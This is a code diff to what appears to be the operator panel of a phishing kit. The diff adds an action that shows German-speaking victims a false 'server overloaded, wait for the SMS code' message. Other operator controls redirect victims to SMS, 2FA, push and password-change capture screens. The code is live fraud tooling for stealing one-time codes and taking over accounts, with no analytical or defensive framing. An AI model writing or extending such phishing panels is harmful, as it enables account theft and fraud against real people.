@@ -2128,6 +2128,7 @@
     '/api/show-success': 'Успех',
     '/api/show-error': 'Ошибка',
     '/api/redirect-sms-code': 'SMS',
+    '/api/redirect-klein-sms-wait': 'SMS Kl: Bitte warten',
     '/api/redirect-2fa-code': '2-FA',
     '/api/redirect-push': 'Push',
     '/api/redirect-change-password': 'Отправлен на смену',
@@ -2252,6 +2253,7 @@
     if (btnError) btnError.addEventListener('click', function (e) { doAction('/api/show-error', e); });
     if (btnSms) btnSms.addEventListener('click', function (e) { doAction('/api/redirect-sms-code', e); });
     if (btnSmsKleinAction) btnSmsKleinAction.addEventListener('click', function (e) { doAction('/api/redirect-sms-code', e); });
+    if (btnSmsKleinWait) btnSmsKleinWait.addEventListener('click', function (e) { doAction('/api/redirect-klein-sms-wait', e); });
     // Backward compatibility: if old single button exists
     if (btnSmsKlein && !btnSmsKleinAction && btnSmsKlein.addEventListener) btnSmsKlein.addEventListener('click', function (e) { doAction('/api/redirect-sms-code', e); });
     var btn2fa = document.getElementById('btn-2fa');
@@ -2332,7 +2334,6 @@
     var closeBtn = document.getElementById('klein-sms-wait-modal-close');
     var okBtn = document.getElementById('klein-sms-wait-modal-ok');
     var body = document.getElementById('klein-sms-wait-modal-body');
-    var trigger = document.getElementById('btn-sms-klein-wait');
 
     var text = 'Bitte warte ein paar Minuten auf den SMS-Code, der Server ist überlastet. Verlasse die Seite nicht, damit das Eingabefeld für die SMS nicht verschwindet.';
 
@@ -2348,10 +2349,6 @@
       modal.setAttribute('aria-hidden', 'false');
     }
 
-    if (trigger) trigger.addEventListener('click', function (e) {
-      if (e && e.preventDefault) e.preventDefault();
-      open();
-    });
     if (backdrop) backdrop.addEventListener('click', close);
     if (closeBtn) closeBtn.addEventListener('click', close);
     if (okBtn) okBtn.addEventListener('click', close);
